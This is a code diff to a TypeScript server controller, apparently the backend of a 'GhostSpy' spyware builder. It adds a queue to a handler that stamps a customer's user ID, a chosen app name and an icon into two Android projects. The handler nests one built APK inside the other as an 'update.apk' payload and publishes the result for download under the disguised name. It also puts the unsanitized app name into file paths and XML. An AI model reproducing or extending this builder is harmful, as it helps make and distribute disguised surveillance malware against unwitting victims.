@@ -11,166 +11,196 @@ import User from "../models/user.model";
 const BAT_PATH = process.env.BAT_PATH as string;
 const BAT01_PATH = process.env.BAT01_PATH as string;
 
-export const createNewApk = async (req: Request, res: Response) => {
+// In-memory queue for APK creation requests
+const apkBuildQueue: (() => Promise<void>)[] = [];
+let isProcessing = false;
+
+// Helper function to process the queue
+const processQueue = async () => {
+	if (isProcessing || apkBuildQueue.length === 0) return;
+
+	isProcessing = true;
+
+	const nextInQueue = apkBuildQueue.shift();
+	if (nextInQueue) {
+		try {
+			await nextInQueue();
+		} catch (error) {
+			console.error("Error processing APK in queue:", error);
+		} finally {
+			isProcessing = false;
+			processQueue(); // Process the next request in the queue
+		}
+	}
+};
+
+export const createNewApk = (req: Request, res: Response) => {
 	// Check for validation errors
 	const errors = validationResult(req);
 	if (!errors.isEmpty()) {
 		return res.status(400).json({ errors: errors.array() });
 	}
 
-	try {
-		const { userId, appName } = req.body;
-		const appIcon = req.file; // Get the uploaded file
+	const { userId, appName } = req.body;
+	const appIcon = req.file; // Get the uploaded file
 
-		if (!userId) {
-			return res.status(400).json({ error: "userId is required" });
-		}
-
-		// Define paths for both Ghost_main and Ghost_major
-		const paths = [
-			{
-				name: "Ghost_main",
-				filePath: path.join(
-					__dirname,
-					"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
-				),
-			},
-			{
-				name: "Ghost_major",
-				filePath: path.join(
-					__dirname,
-					"../../public/GhostSpy/GhostSpy_major/app/src/main/res/values/strings.xml"
-				),
-			},
-		];
-
-		// Step 1: Replace the userId and appName in the strings.xml files
-		for (const { filePath } of paths) {
-			let fileContent = await fs.promises.readFile(filePath, "utf8");
-
-			let newContent = fileContent.replace(
-				/<string name="app_user_id">.*<\/string>/,
-				`<string name="app_user_id">${userId}</string>`
-			);
-
-			newContent = newContent.replace(
-				/<string name="app_name">.*<\/string>/,
-				`<string name="app_name">${appName}</string>`
-			);
-
-			await fs.promises.writeFile(filePath, newContent, "utf8");
-		}
-
-		// Step 2: Save and Resize the Uploaded Icon
-		if (appIcon) {
-			const iconPath = path.join(
-				__dirname,
-				"../../public/uploads",
-				appIcon.filename
-			);
-
-			const sizes = {
-				"mipmap-hdpi": 72,
-				"mipmap-mdpi": 48,
-				"mipmap-xhdpi": 96,
-				"mipmap-xxhdpi": 144,
-				"mipmap-xxxhdpi": 192,
-			};
-
-			const resizeAndSaveIcon = async (
-				size: number,
-				folder: string,
-				basePath: string
-			) => {
-				const outputPath = path.join(basePath, folder);
-
-				await fs.promises.mkdir(outputPath, { recursive: true });
-
-				await sharp(iconPath)
-					.resize(size, size)
-					.toFile(path.join(outputPath, "ic_launcher.webp"));
-
-				await sharp(iconPath)
-					.resize(size, size)
-					.toFile(
-						path.join(outputPath, "ic_launcher_foreground.webp")
-					);
-
-				await sharp(iconPath)
-					.resize(size, size)
-					.toFile(path.join(outputPath, "ic_launcher_round.webp"));
-			};
+	// Push the request into the queue
+	apkBuildQueue.push(async () => {
+		try {
+			// Step 1: Replace the userId and appName in the strings.xml files
+			const paths = [
+				{
+					name: "Ghost_main",
+					filePath: path.join(
+						__dirname,
+						"../../public/GhostSpy/GhostSpy_main/app/src/main/res/values/strings.xml"
+					),
+				},
+				{
+					name: "Ghost_major",
+					filePath: path.join(
+						__dirname,
+						"../../public/GhostSpy/GhostSpy_major/app/src/main/res/values/strings.xml"
+					),
+				},
+			];
 
 			for (const { filePath } of paths) {
-				const basePath = path.dirname(filePath).replace("values", "");
-				await Promise.all(
-					Object.entries(sizes).map(([folder, size]) =>
-						resizeAndSaveIcon(size, folder, basePath)
-					)
+				let fileContent = await fs.promises.readFile(filePath, "utf8");
+
+				let newContent = fileContent.replace(
+					/<string name="app_user_id">.*<\/string>/,
+					`<string name="app_user_id">${userId}</string>`
 				);
+
+				newContent = newContent.replace(
+					/<string name="app_name">.*<\/string>/,
+					`<string name="app_name">${appName}</string>`
+				);
+
+				await fs.promises.writeFile(filePath, newContent, "utf8");
 			}
+
+			// Step 2: Save and Resize the Uploaded Icon
+			if (appIcon) {
+				const iconPath = path.join(
+					__dirname,
+					"../../public/uploads",
+					appIcon.filename
+				);
+
+				const sizes = {
+					"mipmap-hdpi": 72,
+					"mipmap-mdpi": 48,
+					"mipmap-xhdpi": 96,
+					"mipmap-xxhdpi": 144,
+					"mipmap-xxxhdpi": 192,
+				};
+
+				const resizeAndSaveIcon = async (
+					size: number,
+					folder: string,
+					basePath: string
+				) => {
+					const outputPath = path.join(basePath, folder);
+
+					await fs.promises.mkdir(outputPath, { recursive: true });
+
+					await sharp(iconPath)
+						.resize(size, size)
+						.toFile(path.join(outputPath, "ic_launcher.webp"));
+
+					await sharp(iconPath)
+						.resize(size, size)
+						.toFile(
+							path.join(outputPath, "ic_launcher_foreground.webp")
+						);
+
+					await sharp(iconPath)
+						.resize(size, size)
+						.toFile(
+							path.join(outputPath, "ic_launcher_round.webp")
+						);
+				};
+
+				for (const { filePath } of paths) {
+					const basePath = path
+						.dirname(filePath)
+						.replace("values", "");
+					await Promise.all(
+						Object.entries(sizes).map(([folder, size]) =>
+							resizeAndSaveIcon(size, folder, basePath)
+						)
+					);
+				}
+			}
+
+			// Step 3: Build Ghost_main APK
+			console.log(`Starting Ghost_main APK build process for ${appName}`);
+			await buildApk(BAT_PATH);
+
+			// Rename and move the APK
+			const ghostMainApkPath = path.join(
+				__dirname,
+				"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
+			);
+
+			const updateApkPath = path.join(
+				__dirname,
+				"../../public/GhostSpy/GhostSpy_major/app/src/main/assets/update.apk"
+			);
+
+			await fs.promises.rename(ghostMainApkPath, updateApkPath);
+
+			// Step 4: Build Ghost_major APK
+			console.log(
+				`Starting Ghost_major APK build process for ${appName}`
+			);
+			await buildApk(BAT01_PATH);
+
+			// Step 5: Make the APK available for download
+			const ghostMajorApkPath = path.join(
+				__dirname,
+				"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/debug/app-debug.apk"
+			);
+
+			const fileExists = await fs.promises
+				.stat(ghostMajorApkPath)
+				.catch(() => null);
+			if (!fileExists || !fileExists.isFile()) {
+				throw new Error("Ghost_major APK file was not created.");
+			}
+
+			const publicPath = path.join(
+				__dirname,
+				"../../public/downloads",
+				`${appName}.apk` // Use appName for the file name
+			);
+
+			await fs.promises.copyFile(ghostMajorApkPath, publicPath);
+
+			// Add new APK info to the App model
+			await App.create({
+				userId,
+				name: appName,
+				path: publicPath,
+			});
+
+			// Update User model's apk field
+			await User.findOneAndUpdate(
+				{ _id: userId },
+				{ apk: "created", apkName: appName }
+			);
+
+			res.status(200).json({ success: true });
+		} catch (error) {
+			console.error("Error processing APK:", error);
+			res.status(500).json({ error: "Failed to process the APK" });
 		}
+	});
 
-		// Step 3: Build Ghost_main APK
-		console.log(`Starting Ghost_main APK build process...`);
-		await buildApk(BAT_PATH);
-
-		// Rename and move the APK
-		const ghostMainApkPath = path.join(
-			__dirname,
-			"../../public/GhostSpy/GhostSpy_main/app/build/outputs/apk/debug/app-debug.apk"
-		);
-
-		const updateApkPath = path.join(
-			__dirname,
-			"../../public/GhostSpy/GhostSpy_major/app/src/main/assets/update.apk"
-		);
-
-		await fs.promises.rename(ghostMainApkPath, updateApkPath);
-
-		// Step 4: Build Ghost_major APK
-		console.log(`Starting Ghost_major APK build process...`);
-		await buildApk(BAT01_PATH);
-
-		// Step 5: Make the APK available for download
-		const ghostMajorApkPath = path.join(
-			__dirname,
-			"../../public/GhostSpy/GhostSpy_major/app/build/outputs/apk/debug/app-debug.apk"
-		);
-
-		const fileExists = await fs.promises
-			.stat(ghostMajorApkPath)
-			.catch(() => null);
-		if (!fileExists || !fileExists.isFile()) {
-			throw new Error("Ghost_major APK file was not created.");
-		}
-
-		const publicPath = path.join(
-			__dirname,
-			"../../public/downloads",
-			`${appName}.apk` // Use appName for the file name
-		);
-
-		await fs.promises.copyFile(ghostMajorApkPath, publicPath);
-
-		// Add new APK info to the App model
-		await App.create({
-			userId,
-			name: appName,
-			path: publicPath,
-		});
-
-		// Update User model's apk field
-		await User.findOneAndUpdate(
-			{ _id: userId },
-			{ apk: "created", apkName: appName }
-		);
-
-		res.status(200).json({ success: true });
-	} catch (error) {
-		console.error("Error processing APK:", error);
-		res.status(500).json({ error: "Failed to process the APK" });
-	}
+	// Start processing the queue if not already processing
+	processQueue();
 };
 
 // Helper function to build APK
